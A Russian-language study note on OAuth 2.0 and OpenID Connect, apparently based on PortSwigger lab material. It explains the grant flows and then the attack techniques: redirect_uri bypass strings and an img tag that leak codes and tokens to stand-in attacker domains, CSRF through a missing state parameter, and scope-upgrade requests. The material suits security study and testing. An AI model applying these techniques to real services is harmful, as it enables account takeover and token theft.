## Что такое OAuth?

>[!note] **Определение:** 
>**OAuth 2.0 — это протокол делегированного доступа. Это фреймворк авторизации**, а не аутентификации. Его цель — позволить приложению получать **ограниченный доступ** к ресурсам пользователя на другом сервисе, без раскрытия пароля пользователя.


**Как применяется:** Классический пример — "Войти через Facebook". Вы даёте стороннему приложению (например, Spotify) разрешение получить доступ к вашему списку друзей в Facebook или к вашему профилю. OAuth 2.0 управляет этим процессом делегирования прав. Пользователь аутентифицируется напрямую в Facebook (ресурсный сервер), который затем выдаёт приложению Spotify **токен доступа (Access Token)**. Spotify использует этот токен для вызова API Facebook от вашего имени.

> **Примечание**
>
> Хотя современным стандартом является OAuth 2.0, некоторые сайты всё ещё используют устаревшую версию 1a. OAuth 2.0 была написана с нуля, а не разработана напрямую на базе OAuth 1.0. В результате они сильно отличаются. Обратите внимание, что термин «OAuth» в этих материалах относится исключительно к OAuth 2.0.

---

# Как работает OAuth 2.0?

OAuth 2.0 изначально был разработан как способ совместного доступа к конкретным данным между приложениями. Он определяет серию взаимодействий между тремя сторонами: клиентским приложением, владельцем ресурса и провайдером OAuth.

- **Клиентское приложение** — сайт или веб-приложение, которое хочет получить доступ к данным пользователя.
- **Владелец ресурса** — пользователь, к данным которого клиентское приложение хочет получить доступ.
- **Провайдер услуг OAuth** — сайт или приложение, которое контролирует данные пользователя и доступ к ним. Они поддерживают OAuth, предоставляя API для взаимодействия как с сервером авторизации, так и с сервером ресурсов.

Существует множество различных способов реализации самого процесса OAuth. Они известны как OAuth «потоки (flows)» или «[[OAuth 2.0#Типы грантов (grant types) OAuth|grant types]]». Самыми распространёнными являются типы грантов: «authorization code» и «implicit». В широком смысле, оба типа грантов включают следующие этапы:

1. Клиентское приложение запрашивает доступ к подмножеству данных пользователя, указывая, какой тип гранта он хочет использовать и какой именно доступ.
2. Пользователю предлагается войти в сервис OAuth и явно дать согласие на запрошенный доступ.
3. Клиентское приложение получает уникальный токен доступа, подтверждающий, что у него есть разрешение пользователя на доступ к запрашиваемым данным. Точный способ этого процесса значительно зависит от типа гранта.
4. Клиентское приложение использует этот токен доступа для создания API-запросов, которые получают соответствующие данные с сервера ресурсов.

---

## OAuth scopes

Для любого типа гранта OAuth клиентское приложение должно указать, к каким данным оно хочет получить доступ и какие операции выполнять. Он делает это с помощью параметра `scope` запроса авторизации, который отправляется сервису OAuth. 

Базово, OAuth области (scopes), для которых клиентское приложение может запросить доступ, уникальны для каждого сервиса OAuth. Поскольку название области — это просто произвольная текстовая строка, формат может значительно различаться между поставщиками. Некоторые даже используют полноценный URI в качестве названия области, аналогично REST API endpoint. Например, при запросе доступа для чтения списка контактов пользователя имя области может принимать одну из следующих форм в зависимости от используемого сервиса OAuth:

```uri
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

Однако при использовании OAuth для аутентификации часто применяются стандартизированные области OpenID Connect. Например, область `openid profile` будет предоставлять клиентскому приложению доступ к заранее определённому набору базовой информации о пользователе, такой как его адрес электронной почты, имя пользователя и так далее. Подробнее о [[OAuth 2.0#OpenID Connect|OpenID Connect]] мы поговорим позже. 

---

## Типы грантов (grant types) OAuth

---

### Что такое тип гранта OAuth?

Тип гранта OAuth определяет точную последовательность шагов в процессе OAuth. Тип гранта также влияет на то, как клиентское приложение взаимодействует с сервисом OAuth на каждом этапе, включая передачу самого токена доступа. По этой причине типы грантов часто называют «потоками OAuth».

Сервис OAuth должен быть настроен для поддержки определённого типа гранта, прежде чем клиентское приложение сможет инициировать соответствующий поток. Клиентское приложение указывает, какой тип гранта оно хочет использовать в первоначальном запросе авторизации, отправляемом сервису OAuth.

Существует несколько различных типов грантов, каждый из которых имеет разный уровень сложности и соображения по вопросам безопасности. Мы сосредоточимся на типах **«authorization code»** и «implicit», так как они самые распространённые.

---

## Тип гранта: Authorization code

Клиентское приложение и сервис OAuth сначала используют перенаправления для обмена серией браузерных HTTP-запросов, которые запускают этот поток. 
1. Пользователя спрашивают, согласен ли он с запрошенным доступом. 
2. Если он согласен, заявке клиента выдается «код авторизации». 
3. Клиентское приложение затем обменивается этим кодом с сервисом OAuth, чтобы получить «токен доступа», который можно использовать для вызовов API для получения соответствующих пользовательских данных.

Вся коммуникация, которая происходит после обмена кодом/токеном, отправляется от сервера к серверу по безопасному, предварительно настроенному обратному каналу и, следовательно, невидима для конечного пользователя. Этот безопасный канал устанавливается, когда клиентское приложение впервые регистрируется в службе OAuth (то есть задолго до авторизации пользователя). В это время OAuth сервером генерируется `client_secret` и `client_id`, которые клиентское приложение должно использовать для аутентификации при отправке защищённых запросов от сервера к серверу.

> **После регистрации клиентского приложения в OAuth:**
> - **`client_secret`** и **`client_id`** хранятся и у клиентского приложения и у OAuth сервера и передаются по безопасному каналу;
> - `client_id` решает задачу идентификации, а `client_secret` — аутентификации.

Поскольку наиболее конфиденциальные данные (токен доступа и данные пользователя) не отправляются через браузер, этот тип предоставления прав, пожалуй, является самым безопасным. Серверные приложения в идеале должны всегда использовать этот тип предоставления прав, если это возможно.

![[Pasted image 20260131194819.png]]

---

#### 1. Запрос на авторизацию

Клиентское приложение отправляет запрос на конечную точку `/authorization` сервиса OAuth с просьбой получить разрешение на доступ к конкретным данным пользователей. Обратите внимание, что отображение конечных точек может различаться у разных поставщиков — лаборатории PortSwigger используют конечную точку `/auth` для этой цели. Однако вы всегда должны иметь возможность определить конечную точку по параметрам, использованным в запросе. 

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
Host: oauth-authorization-server.com
```

Этот запрос обычно содержит следующие примечательные параметры:

1. `client_id`
   
   > Обязательный параметр, содержащий уникальный идентификатор клиентского приложения. Это значение генерируется, когда клиентское приложение регистрируется в сервисе OAuth.
   > 
2. `redirect_uri`
   
   > URI, на который следует перенаправлять браузер пользователя при отправке кода авторизации клиентскому приложению. Это также известно как «callback URI» или «callback endpoint». Многие атаки на OAuth основаны на использовании недостатков в валидации этого параметра.
   > 
3. `response_type`
   
   > Определяет, какой тип гранта ожидает клиентское приложение и, следовательно, какой поток оно хочет инициировать. Для выдачи гранта "Authorization code" значение должно быть `code`. 
   > 
4. `scope`
   
   > Используется для указания, к какому подмножеству данных пользователя клиентское приложение хочет получить доступ. Обратите внимание, что это могут быть пользовательские области, заданные провайдером OAuth, или стандартизированные области, определённые спецификацией [[OAuth 2.0#OpenID Connect|OpenID Connect]].
   > 
5. `state`
   
   > Сохраняет уникальное, непредсказуемое значение, привязанное к текущей сессии в клиентском приложении. Сервис OAuth должен вернуть это же значение в ответе вместе с кодом авторизации. Этот параметр служит формой CSRF-токена для клиентского приложения, гарантируя, что запрос к конечной точке `/callback` исходит от того же человека, который инициировал поток OAuth. 

---

#### 2. Вход пользователя и согласие

Когда сервер авторизации получает первоначальный запрос, он перенаправляет пользователя на страницу входа, где ему будет предложено войти в свой аккаунт у провайдера OAuth. Например, это часто их аккаунт в социальных сетях.

Затем пользователю будет представлен список данных, к которым клиентское приложение хочет получить доступ. Это основано на параметре `scope`, определённом в запросе авторизации. Пользователь может выбрать, давать согласие на этот доступ или нет.

Важно отметить, что после того как пользователь одобрил определённый `scope` для клиентского приложения, этот шаг будет выполняться автоматически, если у пользователя осталась действительная сессия с сервисом OAuth. Другими словами, при первом выборе «Войти с помощью социальных сетей» пользователь должен войти вручную и дать согласие, но если позже он снова зайдёт в клиентское приложение, он часто сможет войти в систему одним кликом.

---

#### 3. Выдача кода авторизации

Если пользователь даёт согласие на запрошенный доступ, его браузер будет перенаправлен на конечную точку `/callback`, указанную в параметре `redirect_uri` запроса авторизации. В результате этот `GET` запрос будет содержать код авторизации в качестве query параметра. В зависимости от конфигурации, параметр `state` может также передаваться с тем же значением, что и в запросе авторизации. 

```http
GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1 
Host: client-app.com
```

---

#### 4. Запрос токена доступа

После того как клиентское приложение получает код авторизации, ему необходимо обменять его на токен доступа. Для этого он отправляет server-to-server `POST` запрос на конечную точку `/token` сервиса OAuth. Вся коммуникация с этого момента происходит в защищённом бэк-канале и, следовательно, обычно не может быть замечена или контролироваться злоумышленниками. 

```http
POST /token HTTP/1.1 
Host: oauth-authorization-server.com 
… 
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
```

Помимо `client_id` и `code` для авторизации, вы заметите следующие новые параметры: 

1. `client_secret`

> Клиентское приложение должно использовать `client_secret` для аутентификации, включив секретный ключ, назначенный ему при регистрации в сервисе OAuth.
> 
2. `grant_type`

> Использовался для того, чтобы новый конечный узел знал, какой тип гранта хочет использовать клиентское приложение. В этом случае `grant_type` должен быть установлен на `authorization_code`. 

---

#### 5. Предоставление токенов доступа

Сервис OAuth проверит запрос на токен доступа. Если всё соответствует ожиданиям, сервер ответит, предоставляя клиентскому приложению токен доступа с запрошенной областью действий.

```json
{
	"access_token": "z0y9x8w7v6u5",
	"token_type": "Bearer",
	"expires_in": 3600,
	"scope": "openid profile",
	…
}
```

---

#### 6. Вызов API

Теперь, когда клиентское приложение имеет код доступа, оно наконец может получать данные пользователя с сервера ресурсов. Для этого он совершает вызов API на конечную точку `/userinfo` сервиса OAuth. Токен доступа вводится в заголовок `Authorization: Bearer`, чтобы доказать, что клиентское приложение имеет разрешение на доступ к этим данным. 

```http
GET /userinfo HTTP/1.1 
Host: oauth-resource-server.com 
Authorization: Bearer z0y9x8w7v6u5
```

---

#### 7. Грант ресурсов

Сервер ресурсов должен проверить, что токен валиден и принадлежит текущему клиентскому приложению. Если да, то он ответит, отправив запрошенный ресурс, то есть данные пользователя, исходя из объёма токена доступа.

```json
{
	"username":"carlos",
	"email":"carlos@carlos-montoya.net",
	…
}
```

Клиентское приложение наконец может использовать эти данные по назначению. В случае аутентификации OAuth она обычно используется как идентификатор для получения аутентифицированной сессии, фактически входя в систему.

---

## Тип гранта: Implicit (неявный)

Неявный тип гранта гораздо проще. Вместо того чтобы сначала получить код авторизации и затем обменять его на токен доступа, клиентское приложение получает токен доступа сразу после согласия пользователя.

Возможно, вы задаётесь вопросом, почему клиентские приложения не всегда используют неявный тип гранта. Ответ относительно прост — это гораздо менее безопасно. При использовании неявного гранта вся коммуникация происходит через перенаправления браузера — нет защищённого обратного канала, как в потоке авторизационного кода. Это означает, что чувствительный токен доступа и данные пользователя более подвержены потенциальным атакам.

Неявный тип гранта больше подходит для одностраничных приложений и нативных настольных приложений, которые не могут хранить `client_secret` на сервере и, следовательно, не получают больших преимуществ от использования типа "Authorization code". 

![[Pasted image 20260131202051.png]]

---

#### 1. Запрос на авторизацию

Неявный поток начинается примерно так же, как и поток авторизационного кода. Единственное существенное отличие в том, что параметр `response_type` должен быть установлен в `token`. 

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
Host: oauth-authorization-server.com
```

---

#### 2. Вход пользователя и согласие

Пользователь входит в систему и решает, давать ли согласие на запрошенные разрешения или нет. Этот процесс точно такой же, как и для потока авторизационного кода.

---

#### 3. Предоставление токена доступа

Если пользователь дает согласие на запрошенный доступ, здесь начинаются различия. Сервис OAuth перенаправит браузер пользователя на `redirect_uri`, указанный в запросе на авторизацию. Однако вместо отправки query-параметра, содержащего код авторизации, он отправит токен доступа и другие данные, относящиеся к токену, в виде фрагмента URL.

```http
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
Host: client-app.com
```

Поскольку токен доступа отправляется в виде фрагмента URL, он никогда не отправляется напрямую в клиентское приложение. Вместо этого клиентское приложение должно использовать подходящий скрипт для извлечения фрагмента и его сохранения.

---

#### 4. Вызов API

После того как клиентское приложение успешно извлекло токен доступа из фрагмента URL, оно может использовать его для вызовов API на конечную точку `/userinfo` сервиса OAuth. В отличие от потока кода авторизации, это также происходит через браузер. 

```http
GET /userinfo HTTP/1.1 
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```

---

#### 5. Грант ресурсов

Сервер ресурсов должен проверить, что токен валиден и принадлежит текущему клиентскому приложению. Если да, то он ответит, отправив запрошенный ресурс, то есть данные пользователя на основе `scope`, связанного с токеном доступа.

```json
{
	"username":"carlos",
	"email":"carlos@carlos-montoya.net"
}
```

Клиентское приложение наконец может использовать эти данные по назначению. В случае аутентификации OAuth она обычно используется как идентификатор для получения аутентифицированной сессии, фактически входя в систему.

---

## OAuth аутентификация

Хотя изначально OAuth не предназначался для этой цели, он также превратился в средство аутентификации пользователей. 

Для механизмов аутентификации OAuth базовые потоки OAuth в основном остаются прежними; Главное отличие — в том, как клиентское приложение использует полученные данные. С точки зрения конечного пользователя, результат аутентификации OAuth в целом напоминает систему единого входа (SSO) на основе SAML. В этих материалах мы сосредоточимся исключительно на уязвимостях в этом похожем на SSO сценарий.

Аутентификация OAuth обычно реализуется следующим образом:

1. Пользователь выбирает опцию входа через свой аккаунт в соцсетях. Клиентское приложение затем использует сервис OAuth социальной сети для запроса доступа к некоторым данным, которые можно использовать для идентификации пользователя. Например, это может быть адрес электронной почты, зарегистрированный в их аккаунте.
2. После получения токена доступа клиентское приложение запрашивает эти данные у сервера ресурсов, обычно с выделенной конечной точки `/userinfo`. 
3. После получения данных клиентское приложение использует их вместо имени пользователя для входа пользователя. Токен доступа, полученный от сервера авторизации, часто используется вместо традиционного пароля.

---

## Разведка используемого сервиса OAuth

Базовая разведка используемого сервиса OAuth может направить вас в правильном направлении при выявлении уязвимостей.

Само собой разумеется, что вам стоит изучить различные HTTP-взаимодействия, составляющие поток OAuth. Если используется внешний сервис OAuth, вы должны иметь возможность определить конкретного провайдера по имени хоста, куда отправляется запрос на авторизацию. Поскольку эти сервисы предоставляют публичный API, часто доступна подробная документация, которая должна дать вам всестороннюю полезную информацию, например, точные названия конечных устройств и используемые настройки.

Когда вы знаете имя хоста сервера авторизации, всегда пытайтесь отправить `GET` запрос на следующие стандартные конечные точки: 

- `/.well-known/oauth-authorization-server`
- `/.well-known/openid-configuration`

Они часто возвращают конфигурационный файл JSON, содержащий ключевую информацию, например, детали дополнительных функций, которые могут поддерживаться. Иногда это подсказывает о более широкой поверхности атаки и поддерживаемых функциях, которые могут не упомянуть в документации.

---

# Эксплуатация уязвимостей аутентификации OAuth

Уязвимости могут возникать как в реализации OAuth клиентским приложением, так и в самой конфигурации сервиса OAuth.

---

#### 1. Неправильная реализация Implicit (неявного) гранта

Из-за опасностей, связанных с отправкой токенов доступа через браузер, Implicit грант в основном рекомендуется для одностраничных приложений. Однако он также часто используется в классических клиент-серверных веб-приложениях из-за своей относительной простоты.

В Implicit потоке токен доступа отправляется из службы OAuth в клиентское приложение через браузер пользователя в виде query-параметра. Затем клиентское приложение получает доступ к токену с помощью JavaScript. Проблема заключается в том, что если приложение хочет сохранить сессию после закрытия страницы пользователем, ему необходимо где-то сохранить текущие данные пользователя (обычно это идентификатор пользователя и токен доступа).

Чтобы решить эту проблему, клиентское приложение часто отправляет полученные из OAuth данные на сервер в `POST`-запросе, а затем назначает пользователю сессионный файл cookie, фактически регистрируя его. Этот запрос примерно эквивалентен запросу на отправку формы в рамках классического входа в систему на основе пароля. Однако в этом сценарии сервер не имеет никаких секретных данных или паролей для сравнения с отправленными данными. 

>[!note] 
> Если клиентское приложение не проверяет должным образом, что токен доступа соответствует другим данным в запросе, то злоумышленник может изменить часть этих данных, например, имя или почту, чтобы привязать изменённые данные к своему токену доступа и выдать себя за другого пользователя.

Лаба: [[OAuth 2.0#Лабораторные#Lab Authentication bypass via OAuth implicit flow|Authentication bypass via OAuth implicit flow]].

---

#### 2. Недостаточная защита от CSRF

Хотя многие компоненты потоков OAuth являются опциональными, некоторые из них настоятельно рекомендуется использовать, если нет веских причин для отказа от них. Одним из таких компонентов является параметр `state`.

В идеале параметр `state` должен содержать непредсказуемое значение, такое как хеш чего-либо, связанного с сессией пользователя при первом запуске потока OAuth. Затем это значение передается между клиентским приложением и службой OAuth в виде токена CSRF для клиентского приложения. Поэтому, если вы заметили, что запрос на авторизацию не отправляет параметр `state`, это чрезвычайно интересно с точки зрения злоумышленника. Это потенциально означает, что он может инициировать поток OAuth самостоятельно, прежде чем обманом заставить браузер пользователя завершить его, подобно традиционной атаке CSRF. Это может иметь серьезные последствия в зависимости от того, как OAuth используется клиентским приложением.

Рассмотрим веб-сайт, который позволяет пользователям входить в систему с помощью классического механизма на основе пароля или путем привязки своей учетной записи к профилю в социальной сети с помощью OAuth. В этом случае, если приложение не использует параметр `state`, злоумышленник может потенциально захватить учетную запись пользователя-жертвы в клиентском приложении, привязав ее к своей учетной записи в социальной сети.

Лаба: [[OAuth 2.0#Lab Forced OAuth profile linking|Forced OAuth profile linking]]

---

#### 3. Утечка кодов авторизации и токенов доступа.

Пожалуй, самой известной уязвимостью OAuth является ситуация, когда конфигурация самого сервиса OAuth позволяет злоумышленникам похищать коды авторизации или токены доступа, связанные с учетными записями других пользователей. Похитив действительный код или токен, злоумышленник может получить доступ к данным жертвы. В конечном итоге это может привести к полной компрометации ее учетной записи — злоумышленник может потенциально войти в систему под именем жертвы в любом клиентском приложении, зарегистрированном в этом сервисе OAuth.

В зависимости от типа гранта код или токен отправляется через браузер жертвы на конечную точку `/callback`, указанную в параметре `redirect_uri` запроса на авторизацию. Если служба OAuth не может правильно проверить этот URI, злоумышленник может организовать атаку типа CSRF, обманув браузер жертвы и заставив его инициировать поток OAuth, который отправит код или токен на контролируемый злоумышленником `redirect_uri`.

В случае потока "кода авторизации" злоумышленник может потенциально украсть код жертвы до его использования. Затем он может отправить этот код на законную конечную точку `/callback` клиентского приложения (исходный `redirect_uri`), чтобы получить доступ к учетной записи пользователя. В этом сценарии злоумышленнику даже не нужно знать секретный ключ клиента или полученный токен доступа. Если у жертвы есть действующая сессия в службе OAuth, клиентское приложение просто выполнит обмен кодом/токеном от имени злоумышленника, а затем войдет в учетную запись жертвы.

Обратите внимание, что использование `state` или `nonce` защиты не всегда предотвращает такие атаки, поскольку злоумышленник может генерировать новые значения из своего браузера.

Лаба: [[#Lab OAuth account hijacking via redirect_uri|OAuth account hijacking via redirect_uri]]

Более безопасные серверы авторизации потребуют отправки параметра `redirect_uri` также при обмене кодом доступа. Затем сервер может проверить, соответствует ли он тому, который он получил в первоначальном запросе на авторизацию, и в случае несоответствия отклонить обмен. Поскольку это происходит в запросах между серверами через безопасный обратный канал, злоумышленник не может контролировать этот второй параметр `redirect_uri`.

---

#### 4. Недостаточная проверка redirect_uri.

В связи с видами атак, рассмотренными в предыдущем лабораторном задании, для клиентских приложений рекомендуется предоставлять белый список своих подлинных URI обратного вызова при регистрации в службе OAuth. Таким образом, когда служба OAuth получает новый запрос, она может проверить параметр `redirect_uri` по этому белому списку. В этом случае предоставление внешнего URI, скорее всего, приведет к ошибке. Однако все еще могут существовать способы обойти эту проверку.

При аудите потока OAuth следует поэкспериментировать с параметром `redirect_uri`, чтобы понять, как он проверяется. Например:

- Некоторые реализации допускают диапазон подкаталогов, проверяя только то, что строка начинается с правильной последовательности символов, т. е. с утвержденного домена. Следует попробовать удалить или добавить произвольные пути, параметры запроса и фрагменты, чтобы увидеть, что можно изменить, не вызывая ошибку.
- Если вы можете добавить дополнительные значения к параметру `redirect_uri` по умолчанию, вы сможете воспользоваться несоответствиями между разбором URI различными компонентами службы OAuth. Например, вы можете попробовать такие методы, как:
  > ```
  > https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
  > ```
  > Если вы не знакомы с этими методами, рекомендуется ознакомиться с материалами о том, как обойти распространенные средства защиты от SSRF и CORS.
- Иногда вы можете столкнуться с уязвимостями, связанными с загрязнением параметров на стороне сервера (server-side parameter pollution). На всякий случай попробуйте отправить дубликаты параметров redirect_uri следующим образом:
  > ```
  > https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
  > ```
- Некоторые серверы также предоставляют специальные условия для URI localhost, поскольку они часто используются во время разработки. В некоторых случаях любой URI перенаправления, начинающийся с localhost, может быть случайно разрешен в производственной среде. Это может позволить вам обойти проверку, зарегистрировав доменное имя, такое как localhost.evil-user.net.

Важно отметить, что не следует ограничивать тестирование только проверкой параметра `redirect_uri` в отдельности. В реальных условиях часто приходится экспериментировать с различными комбинациями изменений нескольких параметров. Иногда изменение одного параметра может повлиять на проверку других. Например, изменение `response_mode` с `query` на `fragment` иногда может полностью изменить разбор `redirect_uri`, позволяя вам отправлять URI, которые в противном случае были бы заблокированы. Аналогично, если вы заметили, что поддерживается режим ответа `web_message`, это часто позволяет использовать более широкий диапазон поддоменов в `redirect_uri`.

---

#### 5. Кража кодов и токенов доступа через прокси-страницу

Против более защищённых целей вы можете обнаружить, что, несмотря на все попытки, вам не удается успешно отправить внешний домен в качестве `redirect_uri`. Однако это не значит, что пора сдаваться.

К этому моменту вы должны уже достаточно хорошо понимать, какие части URI можно подделать. Теперь главное — использовать эти знания, чтобы попытаться получить доступ к более широкой поверхности атаки внутри самого клиентского приложения. Другими словами, попробуйте выяснить, можно ли изменить параметр `redirect_uri`, чтобы он указывал на любые другие страницы в домене, включенном в белый список.

Попробуйте найти способы, с помощью которых вы сможете успешно получить доступ к разным поддоменам или путям. Например, URI по умолчанию часто находится на пути, специфичном для OAuth, таком как `/oauth/callback`, который вряд ли будет иметь какие-либо интересные подкаталоги. Однако вы можете использовать приемы перебора каталогов, чтобы указать любой произвольный путь в домене. Пример:
> ```
> https://client-app.com/oauth/callback/../../example/path
> ```
>   Может быть интерпретировано на бэкэнде как:  
>   ```
>   https://client-app.com/example/path
>   ```

После того, как вы определили, какие другие страницы можно установить в качестве URI перенаправления, вам следует проверить их на наличие дополнительных уязвимостей, которые можно потенциально использовать для утечки кода или токена. Для потока "авторизационного кода" вам необходимо найти уязвимость, которая дает вам доступ к параметрам запроса, тогда как для "неявного" гранта вам необходимо извлечь фрагмент URL.

Одной из наиболее полезных уязвимостей для этой цели является open redirect. Вы можете использовать его в качестве прокси для перенаправления жертв вместе с их кодом или токеном на домен, контролируемый злоумышленником, где вы можете разместить любой вредоносный скрипт.

Обратите внимание, что для неявного гранта кража токена доступа не только позволяет вам войти в учетную запись жертвы в клиентском приложении. Поскольку весь неявный поток происходит через браузер, вы также можете использовать токен для выполнения собственных вызовов API к серверу ресурсов службы OAuth. Это может позволить вам получить конфиденциальные данные пользователя, к которым вы обычно не можете получить доступ из веб-интерфейса клиентского приложения.

Лабораторная: [[#Lab Stealing OAuth access tokens via an open redirect|Stealing OAuth access tokens via an open redirect]]

---

#### 6. Кража кодов и токенов доступа другими методами

Помимо открытых перенаправлений, следует искать любые другие уязвимости, которые позволяют извлечь код или токен и отправить его на внешний домен. Вот несколько хороших примеров:

1. **Опасный JavaScript, который обрабатывает параметры запроса и части URL**

 > Например, для этого отлично подходят небезопасные скрипты веб-обмена сообщениями. В некоторых сценариях может потребоваться определить более длинную цепочку гаджетов, которая позволяет передать токен через серию скриптов, прежде чем в конечном итоге передать его на внешний домен.

2. **Уязвимости XSS**

> Хотя атаки XSS могут иметь огромное влияние сами по себе, обычно существует небольшой промежуток времени, в течение которого злоумышленник имеет доступ к сеансу пользователя, прежде чем тот закроет вкладку или перейдет на другой сайт. Поскольку атрибут HTTPOnly обычно используется для сессионных файлов cookie, злоумышленник часто также не сможет получить к ним прямой доступ с помощью XSS. Однако, похитив код или токен OAuth, злоумышленник может получить доступ к учетной записи пользователя в своем собственном браузере. Это дает ему гораздо больше времени для изучения данных пользователя и выполнения вредоносных действий, что значительно увеличивает серьезность уязвимости XSS.

3. **Уязвимости HTML-инъекции**

В случаях, когда вы не можете внедрить JavaScript (например, из-за ограничений CSP или строгой фильтрации), вы все равно можете использовать простую HTML-инъекцию для кражи кодов авторизации. Если вы можете направить параметр `redirect_uri` на страницу, на которую можно внедрить собственный HTML-контент, вы сможете украсть код через заголовок Referer. Рассмотрим, например, следующий элемент **img**: `<img src="evil-user.net">`. При попытке загрузить это изображение некоторые браузеры (например, Firefox) отправляют полный URL-адрес в заголовке Referer запроса, включая строку запроса.

Лабораторная: [[#Lab Stealing OAuth access tokens via a proxy page|Stealing OAuth access tokens via a proxy page]]

---

#### 7. Неправильная проверка области действия.

В любом потоке OAuth пользователь должен утвердить запрошенный доступ на основе `scope`, определенного в запросе на авторизацию. Полученный токен позволяет клиентскому приложению получить доступ только к тому `scope`, который был утверждена пользователем. Но в некоторых случаях злоумышленник может «улучшить» токен доступа (украденный или полученный с помощью вредоносного клиентского приложения) с помощью дополнительных разрешений из-за неверной проверки службы OAuth. Процесс выполнения этой операции зависит от типа гранта (`grant`).

---

##### 1. Расширение `scope`: authorization code flow

При использовании потока "authorization code", данные пользователя запрашиваются и отправляются через защищенное соединение между серверами, которое, как правило, не может быть напрямую взломано сторонним злоумышленником. Однако злоумышленник все же может достичь того же результата, зарегистрировав собственное клиентское приложение в службе OAuth.

Например, предположим, что вредоносное клиентское приложение злоумышленника изначально запросило доступ к адресу электронной почты пользователя, используя область действия `openid email`. После того как пользователь одобрил этот запрос, вредоносное клиентское приложение получило код авторизации. Поскольку злоумышленник контролирует свое клиентское приложение, он может добавить в запрос на обмен кодом/токеном еще один параметр области действия, содержащий дополнительную область действия профиля:

```http
POST /token 
Host: oauth-authorization-server.com 
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20email%20profile
```

Если сервер не проверяет `scope` повторно из первоначального запроса на авторизацию, он иногда генерирует токен доступа, используя новый `scope`, и отправляет его клиентскому приложению злоумышленника:

```json
{ "access_token": "z0y9x8w7v6u5", "token_type": "Bearer", "expires_in": 3600, "scope": "openid email profile", … }
```

Затем злоумышленник может использовать свое приложение для выполнения необходимых вызовов API, чтобы получить доступ к данным профиля пользователя.

##### 2. Расширение `scope`: implicit flow

В случае неявного типа предоставления токен доступа отправляется через браузер, что означает, что злоумышленник может похитить токены, связанные с невинными клиентскими приложениями, и использовать их напрямую. После похищения токена доступа он может отправить обычный браузерный запрос на конечную точку `/userinfo` службы OAuth, вручную добавив в процессе новый параметр `scope`.

В идеале служба OAuth должна сравнить это значение `scope` с тем, которое использовалось при генерации токена, но это не всегда так. До тех пор, пока скорректированные разрешения не превышают уровень доступа, ранее предоставленный этому клиентскому приложению, злоумышленник может потенциально получить доступ к дополнительным данным без необходимости получения дополнительного одобрения от пользователя.

---

#### 8. Непроверенная регистрация пользователя

При аутентификации пользователей через OAuth клиентское приложение неявно предполагает, что информация, хранящаяся у поставщика OAuth, является правильной. Это может быть опасным предположением.

Некоторые веб-сайты, предоставляющие услугу OAuth, позволяют пользователям регистрировать учетную запись без проверки всех их данных, включая в некоторых случаях адрес электронной почты. Злоумышленник может воспользоваться этим, зарегистрировав учетную запись у поставщика OAuth с использованием тех же данных, что и целевой пользователь, например известного адреса электронной почты. Затем клиентские приложения могут позволить злоумышленнику войти в систему от имени жертвы через эту поддельную учетную запись у поставщика OAuth.

---

# OpenID Connect

Расширение OAuth с помощью OpenID Connect.

>[!note] **Определение:** 
>Это тонкий, но **критически важный** слой поверх OAuth 2.0, который добавляет функциональность **аутентификации**. По сути, он "замыкает" пробел OAuth 2.0, отвечая на вопрос "Кто этот пользователь?".

---

#### Что такое OpenID Connect?

**OpenID Connect** расширяет протокол OAuth, предоставляя специальный уровень идентификации и аутентификации, который находится над базовой реализацией OAuth.

OpenID Connect решает недостаток аутентификации в OAuth, добавляя стандартизированные функции, связанные с идентификацией, чтобы аутентификация через OAuth работала более надежно и единообразно.

---

## Как работает OpenID Connect?

OpenID Connect органично вписывается в обычные потоки OAuth. С точки зрения клиентского приложения, ключевое отличие заключается в наличии дополнительного стандартизированного набора `scope`, одинакового для всех поставщиков, и дополнительного типа ответа: `id_token` [[#ID-токен]].

---

## Роли OpenID Connect

>[!note] Роли OpenID Connect
>
>Роли OpenID Connect по сути такие же, как и в стандартном OAuth. Основное отличие заключается в том, что в спецификации используется немного другая терминология.
>
>- Relying party (доверяющая сторона) - приложение, которое запрашивает аутентификацию пользователя. Это синоним клиентского приложения OAuth.
>- End user - пользователь, который проходит аутентификацию. Это синоним владельца ресурса OAuth (OAuth resource owner).
>- OpenID provider - служба OAuth, настроенная для поддержки OpenID Connect.

---

## Заявки (claims) и области действия OpenID Connect.

Термин «заявки» (claims) относится к парам `ключ`:`значение`, которые представляют информацию о пользователе на сервере ресурсов. Одним из примеров заявки может быть `"family_name":"Montoya"`.

В отличие от базового OAuth, области которого являются уникальными для каждого поставщика, все службы OpenID Connect используют идентичный набор областей. Чтобы использовать OpenID Connect, клиентское приложение должно указать область openid в запросе на авторизацию. Затем они могут включать одну или несколько других стандартных областей действия:
- profile
- email
- address
- phone

Каждый из этих скоупов соответствует доступу на чтение для подмножества "заявлений" (claims) о пользователе, которые определены в спецификации OpenID. Например, запрос скоупа `openid profile` предоставит клиентскому приложению доступ на чтение к серии "заявлений" (claims), связанных с идентичностью пользователя, таких как `family_name`, `given_name`, `birth_date` и т. д.

---

## ID-токен

Другим важным нововведением OpenID Connect является тип ответа `id_token`. 

**Как применяется:** После того как пользователь даёт разрешение, сервер авторизации возвращает не только **токен доступа (Access Token)**, но и **ID Token**. Этот ID Token — это токен в формате JWT (JSON Web Token), который содержит "утверждения" (claims) о пользователе: его идентификатор, email, имя и т.д., а также информацию о том, как и когда пользователь был в последний раз аутентифицирован службой OAuth. Клиентское приложение может использовать эту информацию, чтобы решить, была ли аутентификация пользователя достаточной. Приложение может проверить подпись этого токена и быть уверенным, что пользователь аутентифицирован.

